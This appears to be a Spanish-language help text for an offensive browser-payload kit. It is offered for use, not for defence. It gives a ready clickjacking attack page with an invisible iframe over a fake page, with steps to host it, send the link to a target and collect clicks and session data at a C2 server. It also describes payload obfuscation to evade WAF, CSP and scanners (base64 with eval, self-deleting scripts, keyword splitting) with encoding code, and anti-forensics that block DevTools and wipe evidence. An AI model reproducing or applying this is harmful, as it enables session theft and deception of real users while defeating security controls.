▶ CLICKJACKING / UI REDRESSING
Como funciona: Iframe del sitio real con opacity:0.001 encima de botones falsos. El usuario cree que interactua con el sitio real.

Requisito: El target NO debe tener X-Frame-Options: DENY. Muchos sitios moviles no lo tienen.

Setup:
1. Genera payload "Clickjacking" en STEAL → guarda como payload.js
2. Crea la pagina de ataque:
<style>#r{position:fixed;top:0;left:0;width:100%;height:100%;opacity:0.001;z-index:2}</style>
<iframe id="r" src="https://TARGET.com"></iframe>
<div style="position:fixed;z-index:1">TU PAGINA FALSA</div>
<script src="payload.js"></script>
3. python3 -m http.server 8080 y envia el link al target.
Cada click llega al C2 con coordenadas XY, elemento y sesion.

▶ OBFUSCACION — EVADIR WAF Y CSP
Tecnicas del payload "Obfuscated":
- base64+eval: El payload real nunca aparece en el HTML fuente
- Anti-bot gate: Solo ejecuta tras interaccion real (click/scroll)
- Self-delete: El script tag se elimina del DOM tras ejecutarse
- Viewport check: Bots y scanners usan viewport pequeno — se cancela
- String split: "fe"+"tc"+"h" evita deteccion por keyword

Generar PAYLOAD_B64:
# En consola del browser:
btoa(encodeURIComponent(document.getElementById('steal-code-out').textContent))

# En Python:
import base64, urllib.parse
b64 = base64.b64encode(urllib.parse.quote(payload_code).encode()).decode()
print(b64)
Pega el resultado en lugar de PAYLOAD_B64 en el payload Obfuscated.
▶ ANTI-FORENSICS / ANTI-DETECT
El payload "Anti-Detect" aplica:
- DevTools blocker: Detecta apertura por diferencia de dimensiones y limpia evidencia
- Right-click disable: Evita "Inspeccionar elemento"
- Keyboard trap: Bloquea F12, Ctrl+Shift+I, Ctrl+U
- Console wipe: console.clear() cada 3s
- History spoof: pushState oculta la URL real
- Tab title spoof: Titulo cambia segun visibilidad de la pestaña
- Headless detect: Detecta Puppeteer/Playwright y no ejecuta el payload

Combinar con otros payloads:
Agrega el payload Anti-Detect PRIMERO, luego pega el payload principal debajo. El Anti-Detect instala los guards antes de que el payload principal se ejecute.
